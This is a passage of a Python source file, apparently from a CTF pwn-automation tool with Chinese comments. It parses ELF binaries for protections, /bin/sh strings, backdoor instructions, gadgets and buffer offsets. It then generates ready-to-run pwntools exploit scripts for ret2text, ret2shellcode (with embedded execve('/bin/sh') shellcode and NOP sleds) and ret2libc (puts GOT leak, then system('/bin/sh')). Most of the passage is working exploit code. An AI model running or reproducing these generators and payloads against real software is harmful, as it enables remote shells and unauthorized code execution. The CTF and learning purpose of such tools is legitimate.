                                'uses_call': uses_call,
                                'description': desc,
                            }
                    # MOV EDI, imm32
                    if text_data[i] == 0xbf:
                        imm = struct.unpack('<I', text_data[i+1:i+5])[0]
                        if imm == (bin_sh_vaddr & 0xFFFFFFFF):
                            insn_vaddr = text_vaddr + i
                            func_start = self._find_func_start_64(text_data, i, text_vaddr)
                            has_cond = self._has_conditional_jump(text_data, i, func_start, text_vaddr) if func_start else False
                            uses_call = self._next_is_call(text_data, i + 5)
                            desc = f"mov edi, 0x{imm:x}  ; /bin/sh @ 0x{bin_sh_vaddr:x}"
                            return {
                                'insn_addr': insn_vaddr,
                                'func_addr': func_start,
                                'has_conditional': has_cond,
                                'uses_call': uses_call,
                                'description': desc,
                            }
            else:
                bin_sh_bytes = struct.pack('<I', bin_sh_vaddr)
                for i in range(len(text_data) - 5):
                    if text_data[i] == 0x68 and text_data[i+1:i+5] == bin_sh_bytes:
                        insn_vaddr = text_vaddr + i
                        func_start = self._find_func_start_32(text_data, i, text_vaddr)
                        uses_call = self._next_is_call(text_data, i + 5)
                        return {
                            'insn_addr': insn_vaddr,
                            'func_addr': func_start,
                            'has_conditional': False,
                            'uses_call': uses_call,
                            'description': f"push 0x{bin_sh_vaddr:x}  ; /bin/sh",
                        }
                    if (i + 7 <= len(text_data) and
                            text_data[i] == 0xc7 and text_data[i+1] == 0x04 and
                            text_data[i+2] == 0x24 and text_data[i+3:i+7] == bin_sh_bytes):
                        insn_vaddr = text_vaddr + i
                        func_start = self._find_func_start_32(text_data, i, text_vaddr)
                        uses_call = self._next_is_call(text_data, i + 7)
                        return {
                            'insn_addr': insn_vaddr,
                            'func_addr': func_start,
                            'has_conditional': False,
                            'uses_call': uses_call,
                            'description': f"mov dword [esp], 0x{bin_sh_vaddr:x}  ; /bin/sh",
                        }

        return None

    def _has_conditional_jump(self, text_data, target_pos, func_start_vaddr, text_vaddr):
        """检测从函数入口到 target 指令之间是否存在条件跳转（jne/je/jg/jl 等）"""
        if not func_start_vaddr:
            return False
        start_offset = func_start_vaddr - text_vaddr
        # 条件跳转操作码: 0x70-0x7F (短跳) 和 0x0F 0x80-0x8F (近跳)
        cond_jump_short = set(range(0x70, 0x80))
        for i in range(start_offset, min(target_pos, len(text_data) - 1)):
            if text_data[i] in cond_jump_short:
                return True
            if text_data[i] == 0x0F and i + 1 < len(text_data) and 0x80 <= text_data[i+1] <= 0x8F:
                return True
        return False

    def _next_is_call(self, text_data, pos):
        """检测 pos 位置之后的几条指令中是否有 call（0xe8 近跳或 0xff /2 间接）"""
        # 在接下来的 16 字节内搜索 call 指令
        for j in range(pos, min(pos + 16, len(text_data))):
            # 0xe8 = call rel32 (近跳)
            if text_data[j] == 0xe8:
                return True
            # 0xff /2 = call [reg] 或 call [mem]（间接调用）
            if text_data[j] == 0xff and j + 1 < len(text_data):
                modrm = text_data[j + 1]
                reg_field = (modrm >> 3) & 7
                if reg_field == 2:  # /2 = call
                    return True
            # 遇到 ret (0xc3) 或 jmp (0xe9/0xeb) 就停止搜索
            if text_data[j] in (0xc3, 0xe9, 0xeb):
                break
        return False

    def _elf_find_ret_gadget(self, data, info, sections):
        """在 .text 段搜索 ret (0xc3) gadget 地址，用于栈对齐"""
        text_sec = self._elf_find_text_section(sections)
        if not text_sec:
            return None
        text_data = data[text_sec['sh_offset']:text_sec['sh_offset'] + text_sec['sh_size']]
        text_vaddr = text_sec['sh_addr']
        for i in range(len(text_data)):
            if text_data[i] == 0xc3:
                return text_vaddr + i
        return None

    def _find_func_start_64(self, text_data: bytes, pos: int, text_vaddr: int):
        """向前搜索函数起始（64位），找 push rbp / endbr64"""
        search_start = max(0, pos - 256)
        for j in range(pos - 1, search_start, -1):
            # endbr64: f3 0f 1e fa
            if j >= 3 and text_data[j-3:j+1] == b'\xf3\x0f\x1e\xfa':
                return text_vaddr + j - 3
            # push rbp: 55
            if text_data[j] == 0x55:
                # 确认后跟 mov rbp, rsp (48 89 e5) 或其他合理指令
                if j + 3 < len(text_data) and text_data[j+1:j+4] == b'\x48\x89\xe5':
                    return text_vaddr + j
        return None

    def _find_func_start_32(self, text_data: bytes, pos: int, text_vaddr: int):
        """向前搜索函数起始（32位），找 push ebp"""
        search_start = max(0, pos - 256)
        for j in range(pos - 1, search_start, -1):
            # push ebp: 55, 后跟 mov ebp, esp (89 e5)
            if text_data[j] == 0x55:
                if j + 2 < len(text_data) and text_data[j+1:j+3] == b'\x89\xe5':
                    return text_vaddr + j
        return None

    def _elf_estimate_buffer_offset(self, data: bytes, info: dict, sections: list, symbols: list):
        """
        估算缓冲区溢出偏移：在 main/vuln 等函数中搜索
        sub rsp, N 或 lea rax, [rbp-N] 指令。
        返回 (offset, description) 或 None
        """
        is_64 = info['is_64']
        info['fmt']
        info['ptr_size']

        # 找 main 或 vuln 函数
        target_funcs = ['main', 'vuln', 'vulnerable', 'func', 'read_input', 'get_input']
        func_sym = None
        for name in target_funcs:
            for sym in symbols:
                if sym['name'] == name and sym['type'] == 2 and sym['value'] != 0:
                    func_sym = sym
                    break
            if func_sym:
                break

        if not func_sym:
            # 如果找不到命名函数，尝试 entry point
            return None

        func_vaddr = func_sym['value']
        func_size = func_sym['size'] if func_sym['size'] > 0 else 256

        # 转换为文件偏移
        phdrs = self._parse_elf_program_headers(data, info)
        func_foff = self._elf_vaddr_to_file_offset(phdrs, func_vaddr)
        if func_foff is None:
            return None

        func_data = data[func_foff:func_foff + min(func_size, 512)]
        buf_size = None
        desc = ""

        if is_64:
            # 搜索 sub rsp, imm8: 48 83 ec XX
            for i in range(len(func_data) - 4):
                if func_data[i] == 0x48 and func_data[i+1] == 0x83 and func_data[i+2] == 0xec:
                    n = func_data[i+3]
                    if 0x10 <= n <= 0xf0:
                        buf_size = n
                        desc = f"sub rsp, 0x{n:x} in {func_sym['name']}"
                        break
            # 搜索 sub rsp, imm32: 48 81 ec XX XX XX XX
            if buf_size is None:
                for i in range(len(func_data) - 7):
                    if func_data[i] == 0x48 and func_data[i+1] == 0x81 and func_data[i+2] == 0xec:
                        n = struct.unpack('<I', func_data[i+3:i+7])[0]
                        if 0x10 <= n <= 0x10000:
                            buf_size = n
                            desc = f"sub rsp, 0x{n:x} in {func_sym['name']}"
                            break
            # 搜索 lea rax/rdi, [rbp-N]: 48 8d 45 XX 或 48 8d 7d XX
            if buf_size is None:
                for i in range(len(func_data) - 4):
                    if func_data[i] == 0x48 and func_data[i+1] == 0x8d:
                        if func_data[i+2] in (0x45, 0x7d, 0x4d, 0x55):  # [rbp-N]
                            n_signed = struct.unpack('b', func_data[i+3:i+4])[0]
                            if n_signed < 0:
                                buf_size = -n_signed
                                reg_name = {0x45: 'rax', 0x7d: 'rdi', 0x4d: 'rcx', 0x55: 'rdx'}.get(func_data[i+2], '?')
                                desc = f"lea {reg_name}, [rbp-0x{buf_size:x}] in {func_sym['name']}"
                                break
            if buf_size is not None:
                offset = buf_size + 8  # +8 for saved rbp
                return (offset, desc)
        else:
            # 32位: sub esp, imm8: 83 ec XX
            for i in range(len(func_data) - 3):
                if func_data[i] == 0x83 and func_data[i+1] == 0xec:
                    n = func_data[i+2]
                    if 0x10 <= n <= 0xf0:
                        buf_size = n
                        desc = f"sub esp, 0x{n:x} in {func_sym['name']}"
                        break
            # sub esp, imm32: 81 ec XX XX XX XX
            if buf_size is None:
                for i in range(len(func_data) - 6):
                    if func_data[i] == 0x81 and func_data[i+1] == 0xec:
                        n = struct.unpack('<I', func_data[i+2:i+6])[0]
                        if 0x10 <= n <= 0x10000:
                            buf_size = n
                            desc = f"sub esp, 0x{n:x} in {func_sym['name']}"
                            break
            # lea eax, [ebp-N]: 8d 45 XX
            if buf_size is None:
                for i in range(len(func_data) - 3):
                    if func_data[i] == 0x8d and func_data[i+1] in (0x45, 0x7d, 0x4d, 0x55):
                        n_signed = struct.unpack('b', func_data[i+2:i+3])[0]
                        if n_signed < 0:
                            buf_size = -n_signed
                            reg_name = {0x45: 'eax', 0x7d: 'edi', 0x4d: 'ecx', 0x55: 'edx'}.get(func_data[i+1], '?')
                            desc = f"lea {reg_name}, [ebp-0x{buf_size:x}] in {func_sym['name']}"
                            break
            if buf_size is not None:
                offset = buf_size + 4  # +4 for saved ebp
                return (offset, desc)

        return None

    def _generate_connect_code(self, remote_info, filepath: str):
        """生成 pwntools 连接代码"""
        basename = os.path.basename(filepath)
        if remote_info:
            host, port = remote_info
            return (
                f"# p = process('./{basename}')\n"
                f"p = remote('{host}', {port})"
            )
        else:
            return (
                f"p = process('./{basename}')\n"
                f"# p = remote('host', port)  # 远程连接"
            )

    # ========== 自动 ret2text ==========

    def auto_ret2text(self, filepath: str, remote: str = "") -> str:
        """自动 ret2text 分析：检测后门函数并生成 exploit"""
        data = read_file_bytes(filepath)
        basename = os.path.basename(filepath)
        lines = [f"=== auto_ret2text: {basename} ===\n"]

        # 1. 检查 ELF 格式
        info = self._parse_elf_header(data)
        if info is None:
            return t("pwn.auto.not_elf", "Not an ELF file")

        is_64 = info['is_64']
        arch_str = "x64" if is_64 else "x86"
        ctx_arch = "amd64" if is_64 else "i386"
        p_func = "p64" if is_64 else "p32"
        info['ptr_size']
        lines.append(f"[*] Architecture: {arch_str} ({'little-endian' if info['is_le'] else 'big-endian'})")

        # 2. 解析 sections, symbols, program headers
        sections = self._parse_elf_sections(data, info)
        symbols = self._parse_elf_symbols(data, info, sections)
        phdrs = self._parse_elf_program_headers(data, info)

        # 3. 搜索危险函数
        dangerous = self._elf_find_dangerous_funcs(symbols)
        if dangerous:
            lines.append("\n[*] Dangerous functions found:")
            for d in dangerous:
                lines.append(f"    - {d['name']} @ 0x{d['value']:x}")
        else:
            lines.append("\n[-] No obvious dangerous functions found in symbol table")

        # 4. 搜索后门函数 (system/execve)
        backdoor_funcs = self._elf_find_backdoor_funcs(symbols)
        if backdoor_funcs:
            lines.append("\n[*] Backdoor-related functions:")
            for bf in backdoor_funcs:
                lines.append(f"    - {bf['name']} @ 0x{bf['value']:x}")

        # 5. 搜索 /bin/sh 字符串
        useful_strings = self._elf_find_useful_strings(data, phdrs)
        bin_sh_found = [s for s in useful_strings if s['string'] == '/bin/sh']
        if useful_strings:
            lines.append("\n[*] Useful strings:")
            for us in useful_strings:
                lines.append(f"    - \"{us['string']}\" @ 0x{us['vaddr']:x}")

        # 6. 搜索后门目标地址（加载 /bin/sh 的指令）
        backdoor_target = self._elf_find_backdoor_target(data, info, sections, phdrs)
        uses_call = False
        if backdoor_target:
            insn_addr = backdoor_target['insn_addr']
            func_addr = backdoor_target['func_addr']
            has_cond = backdoor_target['has_conditional']
            uses_call = backdoor_target.get('uses_call', False)
            target_desc = backdoor_target['description']

            lines.append("\n[+] Backdoor target found!")
            lines.append(f"    Instruction: {target_desc}")
            lines.append(f"    Instruction address: 0x{insn_addr:x}")
            if func_addr and func_addr != insn_addr:
                lines.append(f"    Function entry: 0x{func_addr:x}")
            if has_cond:
                lines.append("    [!] Conditional branch detected between function entry and target!")
                lines.append(f"        -> Jump directly to 0x{insn_addr:x} to skip the check")
            if uses_call:
                lines.append("    [*] Target uses 'call system' (not ret-into-system)")
                lines.append("        -> No ret gadget needed (call handles stack alignment)")
            final_target = insn_addr
        else:
            if backdoor_funcs and bin_sh_found:
                lines.append("\n[~] system() and /bin/sh found, but no direct backdoor function detected")
                lines.append("    Consider using ret2libc approach")
            else:
                lines.append("\n[-] No backdoor target found (no /bin/sh loading instruction)")
                lines.append("    ret2text may not be applicable for this binary")
                return "\n".join(lines)
            final_target = None

        # 6b. 搜索 ret gadget（仅当目标不使用 call 时才需要）
        ret_gadget = None
        need_ret = is_64 and not uses_call
        if need_ret:
            ret_gadget = self._elf_find_ret_gadget(data, info, sections)
            if ret_gadget:
                lines.append(f"\n[*] ret gadget found: 0x{ret_gadget:x} (for stack alignment)")
            else:
                lines.append("\n[~] No ret gadget found (may need manual alignment)")

        # 7. 计算缓冲区偏移
        buf_info = self._elf_estimate_buffer_offset(data, info, sections, symbols)
        if buf_info:
            offset, offset_desc = buf_info
            lines.append(f"\n[*] Buffer offset estimated: {offset} (0x{offset:x})")
            lines.append(f"    Source: {offset_desc}")
        else:
            offset = None
            lines.append("\n[~] Could not auto-detect buffer offset")
            lines.append("    Use 'generate_pattern' + 'find_pattern_offset' to determine it")

        # 8. 生成 exploit 脚本
        remote_info = self._parse_remote(remote)
        connect_code = self._generate_connect_code(remote_info, filepath)

        offset_val = offset if offset else "0x00  # TODO: fill in the correct offset"
        target_val = f"0x{final_target:x}" if final_target else "0x0  # TODO: fill in backdoor address"

        # 构造 payload — 根据 uses_call 决定是否加 ret gadget
        if need_ret and ret_gadget:
            # 目标通过 ret 进入 system → 需要 ret gadget 对齐
            ret_line = f"ret = 0x{ret_gadget:x}           # ret gadget (stack alignment)"
            payload_build = (
                f"payload = b'A' * offset\n"
                f"payload += {p_func}(ret)           # stack alignment (x64 movaps)\n"
                f"payload += {p_func}(target)"
            )
        else:
            # 目标通过 call 调用 system → 不需要 ret gadget
            ret_line = "# No ret gadget needed (target uses 'call system')" if uses_call else ""
            payload_build = (
                f"payload = b'A' * offset\n"
                f"payload += {p_func}(target)"
            )

        exploit = f'''
#!/usr/bin/env python3
# auto_ret2text exploit for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}
elf = ELF('./{basename}')

# Backdoor / target address (instruction, not function entry)
target = {target_val}
{ret_line}

# Buffer overflow offset
offset = {offset_val}

# Build payload
{payload_build}

# Send payload
# Common recv patterns (uncomment the one that matches, or add your own):
# p.recvuntil(b'Input')
# p.recvuntil(b'input')
# p.recvuntil(b'Please input')
# p.recvuntil(b'Enter')
# p.recvuntil(b'>')
# p.recvuntil(b': ')
# p.recvuntil(b'?\n')
# p.recvuntil(b'name')
# p.recvuntil(b'buf')
# p.recvuntil(b'bof')
# p.recvuntil(b'Welcome')
p.recvuntil(b':')  # <-- adjust to match the server prompt
p.sendline(payload)

p.interactive()
'''
        lines.append("\n=== Generated Exploit ===")
        lines.append(exploit)

        return "\n".join(lines)

    # ========== 自动 ret2shellcode ==========

    def auto_ret2shellcode(self, filepath: str, remote: str = "") -> str:
        """自动 ret2shellcode 分析：检测 NX 关闭 + 溢出漏洞并生成 exploit"""
        data = read_file_bytes(filepath)
        basename = os.path.basename(filepath)
        lines = [f"=== auto_ret2shellcode: {basename} ===\n"]

        # 1. 检查 ELF
        info = self._parse_elf_header(data)
        if info is None:
            return t("pwn.auto.not_elf", "Not an ELF file")

        is_64 = info['is_64']
        arch_str = "x64" if is_64 else "x86"
        ctx_arch = "amd64" if is_64 else "i386"
        p_func = "p64" if is_64 else "p32"
        info['ptr_size']
        lines.append(f"[*] Architecture: {arch_str}")

        # 2. 解析
        sections = self._parse_elf_sections(data, info)
        symbols = self._parse_elf_symbols(data, info, sections)
        phdrs = self._parse_elf_program_headers(data, info)
        protections = self._elf_checksec(data, info, phdrs)

        # 3. 检测 NX
        nx_enabled = protections['nx']
        lines.append(f"\n[*] NX (No-eXecute): {'Enabled' if nx_enabled else 'Disabled'}")

        if nx_enabled:
            lines.append("\n[!] NX is enabled - stack is NOT executable")
            lines.append("    ret2shellcode is NOT applicable")
            lines.append("    Consider using ROP-based approaches:")
            lines.append("      - ret2text (if backdoor exists)")
            lines.append("      - ret2libc")
            lines.append("      - ret2syscall")
            lines.append("      - Use 'auto_ret2text' or 'auto_pwn_analyze' for alternatives")
            return "\n".join(lines)

        lines.append("    [+] Stack is executable! ret2shellcode is viable")

        # 4. 检测溢出漏洞
        dangerous = self._elf_find_dangerous_funcs(symbols)
        if dangerous:
            lines.append("\n[*] Dangerous functions (potential overflow):")
            for d in dangerous:
                lines.append(f"    - {d['name']} @ 0x{d['value']:x}")
        else:
            lines.append("\n[~] No obvious dangerous functions found (may still have overflow)")

        # 5. 其他保护
        lines.append("\n[*] Other protections:")
        lines.append(f"    Canary: {'Enabled' if protections['canary'] else 'Disabled'}")
        lines.append(f"    PIE:    {'Enabled' if protections['pie'] else 'Disabled'}")
        lines.append(f"    RELRO:  {protections['relro'].capitalize()}")

        if protections['canary']:
            lines.append("\n[!] Warning: Stack canary is enabled")
            lines.append("    You may need to leak the canary first")

        # 6. 计算偏移
        buf_info = self._elf_estimate_buffer_offset(data, info, sections, symbols)
        if buf_info:
            offset, offset_desc = buf_info
            lines.append(f"\n[*] Buffer offset estimated: {offset} (0x{offset:x})")
            lines.append(f"    Source: {offset_desc}")
        else:
            offset = None
            lines.append("\n[~] Could not auto-detect buffer offset")
            lines.append("    Use 'generate_pattern' + 'find_pattern_offset' to determine it")

        # 7. 选择 shellcode
        if is_64:
            shellcode_hex = (
                "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62"
                "\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54"
                "\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
            )
            shellcode_desc = "Linux x64 execve(/bin/sh) - 23 bytes"
        else:
            shellcode_hex = (
                "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
                "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
                "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
            )
            shellcode_desc = "Linux x86 execve(/bin/sh) - 23 bytes"

        lines.append(f"\n[*] Shellcode: {shellcode_desc}")

        # 8. 生成 exploit
        remote_info = self._parse_remote(remote)
        connect_code = self._generate_connect_code(remote_info, filepath)

        offset_val = offset if offset else "0x00  # TODO: fill in the correct offset"

        exploit = f'''
#!/usr/bin/env python3
# auto_ret2shellcode exploit for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}

# Shellcode: {shellcode_desc}
shellcode = b"{shellcode_hex}"

# Buffer overflow offset
offset = {offset_val}

# === Strategy 1: shellcode + padding + ret_addr (return to buffer) ===
# If you know the buffer address (e.g., leaked or fixed):
buf_addr = 0x0  # TODO: fill in buffer address (use gdb to find)

payload = shellcode
payload += b'\\x90' * (offset - len(shellcode))  # NOP sled padding
payload += {p_func}(buf_addr)

# === Strategy 2: padding + ret_addr + NOP sled + shellcode ===
# Put shellcode after the return address with NOP sled
# buf_addr_after_ret = 0x0  # address after return address
# payload = b'A' * offset
# payload += {p_func}(buf_addr_after_ret)
# payload += b'\\x90' * 64  # NOP sled
# payload += shellcode

# Send payload
p.recvuntil(b'> ')  # TODO: adjust the recv pattern
p.sendline(payload)

p.interactive()
'''
        lines.append("\n=== Generated Exploit ===")
        lines.append(exploit)

        # Tips
        lines.append("=== Tips ===")
        lines.append("  - Use GDB to find the buffer address: break at the vulnerable function,")
        lines.append("    then check RSP/ESP after the function prologue")
        lines.append("  - If ASLR is disabled, buffer address is fixed")
        lines.append(f"  - Use 'gdb -q ./{basename}' -> 'b main' -> 'r' -> 'info proc mappings'")

        return "\n".join(lines)

    # ========== 综合 Pwn 分析 ==========

    def auto_pwn_analyze(self, filepath: str, remote: str = "") -> str:
        """综合 Pwn 分析：checksec + 漏洞搜索 + 利用路线推荐 + 自动生成 exploit"""
        data = read_file_bytes(filepath)
        basename = os.path.basename(filepath)
        lines = [f"{'=' * 60}"]
        lines.append(f"  Comprehensive Pwn Analysis: {basename}")
        lines.append(f"{'=' * 60}\n")

        # 1. 检查 ELF
        info = self._parse_elf_header(data)
        if info is None:
            return t("pwn.auto.not_elf", "Not an ELF file")

        is_64 = info['is_64']
        arch_str = "x64" if is_64 else "x86"
        ctx_arch = "amd64" if is_64 else "i386"
        p_func = "p64" if is_64 else "p32"
        info['ptr_size']

        lines.append(f"[*] Architecture: {arch_str} ({'little-endian' if info['is_le'] else 'big-endian'})")
        lines.append(f"[*] Entry point: 0x{info['e_entry']:x}")

        # 2. 解析
        sections = self._parse_elf_sections(data, info)
        symbols = self._parse_elf_symbols(data, info, sections)
        phdrs = self._parse_elf_program_headers(data, info)

        # 3. checksec
        protections = self._elf_checksec(data, info, phdrs)
        lines.append("\n--- Checksec ---")
        lines.append(f"  NX:     {'Enabled' if protections['nx'] else 'Disabled'}")
        lines.append(f"  Canary: {'Enabled' if protections['canary'] else 'Disabled'}")
        lines.append(f"  PIE:    {'Enabled' if protections['pie'] else 'Disabled'}")
        lines.append(f"  RELRO:  {protections['relro'].capitalize()}")
        lines.append(f"  FORTIFY:{' Enabled' if protections['fortify'] else ' Disabled'}")

        # 4. 搜索危险函数
        dangerous = self._elf_find_dangerous_funcs(symbols)
        lines.append("\n--- Dangerous Functions ---")
        if dangerous:
            for d in dangerous:
                lines.append(f"  [!] {d['name']} @ 0x{d['value']:x}")
        else:
            lines.append("  (none found in symbol table)")

        # 5. 搜索后门函数
        backdoor_funcs = self._elf_find_backdoor_funcs(symbols)
        lines.append("\n--- Backdoor Functions ---")
        if backdoor_funcs:
            for bf in backdoor_funcs:
                lines.append(f"  [+] {bf['name']} @ 0x{bf['value']:x}")
        else:
            lines.append("  (none found)")

        # 6. 搜索有用字符串
        useful_strings = self._elf_find_useful_strings(data, phdrs)
        lines.append("\n--- Useful Strings ---")
        if useful_strings:
            for us in useful_strings:
                lines.append(f"  \"{us['string']}\" @ 0x{us['vaddr']:x}")
        else:
            lines.append("  (none found)")

        # 搜索后门目标
        backdoor_target = self._elf_find_backdoor_target(data, info, sections, phdrs)
        if backdoor_target:
            bt = backdoor_target
            lines.append("\n--- Backdoor Target ---")
            lines.append(f"  [+] Instruction: 0x{bt['insn_addr']:x}")
            if bt.get('func_addr') and bt['func_addr'] != bt['insn_addr']:
                lines.append(f"  [+] Function entry: 0x{bt['func_addr']:x}")
            if bt.get('has_conditional'):
                lines.append("  [!] Conditional branch detected -> jumping to instruction address")
            lines.append(f"  [+] Detail: {bt['description']}")

        # 7. 缓冲区偏移
        buf_info = self._elf_estimate_buffer_offset(data, info, sections, symbols)
        lines.append("\n--- Buffer Offset ---")
        if buf_info:
            offset, offset_desc = buf_info
            lines.append(f"  [*] Estimated offset: {offset} (0x{offset:x})")
            lines.append(f"  [*] Source: {offset_desc}")
        else:
            offset = None
            lines.append("  [~] Could not auto-detect, use pattern to find it")

        # 8. 推荐利用路线
        has_backdoor_target = backdoor_target is not None
        has_system = any(bf['name'] == 'system' for bf in backdoor_funcs)
        has_execve = any(bf['name'] == 'execve' for bf in backdoor_funcs)
        has_bin_sh = any(s['string'] == '/bin/sh' for s in useful_strings)
        nx_disabled = not protections['nx']
        no_canary = not protections['canary']
        no_pie = not protections['pie']

        lines.append(f"\n{'=' * 60}")
        lines.append("  Recommended Exploit Route")
        lines.append(f"{'=' * 60}")

        route_chosen = None

        # Route 1: ret2text
        if has_backdoor_target and no_canary:
            lines.append("\n  [Route 1 - RECOMMENDED] ret2text")
            lines.append("    - Backdoor function with /bin/sh detected")
            lines.append("    - Direct return-to-text exploitation")
            lines.append("    - Difficulty: Easy")
            route_chosen = "ret2text"

        # Route 2: ret2shellcode
        elif nx_disabled and no_canary:
            lines.append("\n  [Route 2 - RECOMMENDED] ret2shellcode")
            lines.append("    - NX is disabled (stack executable)")
            lines.append("    - Inject and execute shellcode on stack")
            lines.append("    - Difficulty: Easy-Medium")
            route_chosen = "ret2shellcode"

        # Route 3: ret2libc
        elif (has_system or has_execve) and not has_bin_sh and no_canary:
            lines.append("\n  [Route 3 - RECOMMENDED] ret2libc")
            lines.append("    - system()/execve() available but no /bin/sh string")
            lines.append("    - Need to find /bin/sh in libc or use ROP gadgets")
            lines.append("    - Difficulty: Medium")
            route_chosen = "ret2libc"

        # Route 4: ret2libc with system + /bin/sh
        elif has_system and has_bin_sh and no_canary:
            lines.append("\n  [Route 4 - RECOMMENDED] ret2libc (system + /bin/sh available)")
            lines.append("    - Both system() and /bin/sh found")
            lines.append("    - Classic ret2libc exploitation")
            lines.append("    - Difficulty: Easy-Medium")
            route_chosen = "ret2libc_easy"

        # Route 5: full protection
        else:
            lines.append("\n  [Route 5] Advanced exploitation required")
            if protections['canary']:
                lines.append("    - Canary enabled: need to leak canary first (format string / brute force)")
            if protections['pie']:
                lines.append("    - PIE enabled: need address leak")
            if protections['nx']:
                lines.append("    - NX enabled: use ROP chain")
            if protections['relro'] == 'full':
                lines.append("    - Full RELRO: GOT overwrite not possible")
            lines.append("    - Consider: format string / heap exploit / ret2csu / SROP")
            lines.append("    - Difficulty: Hard")
            route_chosen = "advanced"

        # 列出其他可行路线
        lines.append("\n  --- Other possible routes ---")
        if has_backdoor_target and route_chosen != "ret2text":
            lines.append("  [Alt] ret2text (backdoor available, may need canary bypass)")
        if nx_disabled and route_chosen != "ret2shellcode":
            lines.append("  [Alt] ret2shellcode (NX disabled)")
        if (has_system or has_execve) and route_chosen not in ("ret2libc", "ret2libc_easy"):
            lines.append("  [Alt] ret2libc")
        if no_canary and not no_pie:
            lines.append("  [Alt] Leak PIE base first, then ROP")
        if protections['relro'] != 'full':
            lines.append("  [Alt] GOT overwrite (RELRO is not full)")

        # 9. 生成 exploit
        remote_info = self._parse_remote(remote)
        connect_code = self._generate_connect_code(remote_info, filepath)
        offset_val = offset if offset else "0x00  # TODO: determine with pattern"

        if route_chosen == "ret2text" and backdoor_target:
            bt = backdoor_target
            target_addr = bt['insn_addr'] if isinstance(bt, dict) else bt[0]
            bt_uses_call = bt.get('uses_call', False) if isinstance(bt, dict) else False
            # ret gadget: 仅当目标不使用 call 时才需要
            need_ret = is_64 and not bt_uses_call
            ret_gadget = self._elf_find_ret_gadget(data, info, sections) if need_ret else None
            if ret_gadget:
                ret_line = f"ret = 0x{ret_gadget:x}           # ret gadget (stack alignment)"
            elif bt_uses_call:
                ret_line = "# No ret gadget needed (target uses 'call system')"
            else:
                ret_line = ""
            if need_ret and ret_gadget:
                payload_code = (
                    "payload = b'A' * offset\n"
                    "payload += p64(ret)           # stack alignment\n"
                    "payload += p64(target)"
                )
            else:
                payload_code = (
                    f"payload = b'A' * offset\n"
                    f"payload += {p_func}(target)"
                )
            exploit = f'''
#!/usr/bin/env python3
# auto_pwn exploit - ret2text for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}
elf = ELF('./{basename}')

# Backdoor target address (instruction, not function entry)
target = 0x{target_addr:x}
{ret_line}

# Buffer overflow offset
offset = {offset_val}

# Build payload
{payload_code}

# Send (uncomment the matching pattern):
# p.recvuntil(b'Input')
# p.recvuntil(b'>')
# p.recvuntil(b': ')
p.recvuntil(b':')  # <-- adjust to match server prompt
p.sendline(payload)

p.interactive()
'''

        elif route_chosen == "ret2shellcode":
            if is_64:
                sc_hex = (
                    "\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62"
                    "\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54"
                    "\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05"
                )
            else:
                sc_hex = (
                    "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
                    "\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
                    "\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
                )
            exploit = f'''
#!/usr/bin/env python3
# auto_pwn exploit - ret2shellcode for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}

shellcode = b"{sc_hex}"

offset = {offset_val}
buf_addr = 0x0  # TODO: find buffer address via GDB

payload = shellcode
payload += b'\\x90' * (offset - len(shellcode))
payload += {p_func}(buf_addr)

p.recvuntil(b'> ')  # TODO: adjust
p.sendline(payload)

p.interactive()
'''

        elif route_chosen in ("ret2libc", "ret2libc_easy"):
            if is_64:
                exploit = f'''
#!/usr/bin/env python3
# auto_pwn exploit - ret2libc for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}
elf = ELF('./{basename}')
libc = ELF('./libc.so.6')  # TODO: use correct libc

offset = {offset_val}

# x64: need pop rdi gadget
pop_rdi = 0x0  # TODO: ROPgadget --binary {basename} | grep "pop rdi"
ret = 0x0      # TODO: ROPgadget --binary {basename} | grep ": ret$"

# Step 1: Leak libc address
payload1 = b'A' * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.symbols['main'])  # return to main

p.recvuntil(b'> ')  # TODO: adjust
p.sendline(payload1)

leaked = u64(p.recvuntil(b'\\n')[:-1].ljust(8, b'\\x00'))
log.info(f'Leaked puts: {{hex(leaked)}}')

# Step 2: Calculate libc base
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# Step 3: Getshell
payload2 = b'A' * offset
payload2 += p64(ret)       # stack alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.recvuntil(b'> ')  # TODO: adjust
p.sendline(payload2)

p.interactive()
'''
            else:
                exploit = f'''
#!/usr/bin/env python3
# auto_pwn exploit - ret2libc for {basename}
from pwn import *

context.arch = '{ctx_arch}'
context.log_level = 'debug'

{connect_code}
elf = ELF('./{basename}')
libc = ELF('./libc.so.6')  # TODO: use correct libc

offset = {offset_val}

# Step 1: Leak libc address
payload1 = b'A' * offset
payload1 += p32(elf.plt['puts'])
payload1 += p32(elf.symbols['main'])  # return to main
payload1 += p32(elf.got['puts'])       # argument

p.recvuntil(b'> ')  # TODO: adjust
p.sendline(payload1)

leaked = u32(p.recv(4))
log.info(f'Leaked puts: {{hex(leaked)}}')

# Step 2: Calculate libc base
libc_base = leaked - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# Step 3: Getshell
payload2 = b'A' * offset
payload2 += p32(system)
payload2 += p32(0)       # fake return address
payload2 += p32(bin_sh)  # argument

p.recvuntil(b'> ')  # TODO: adjust
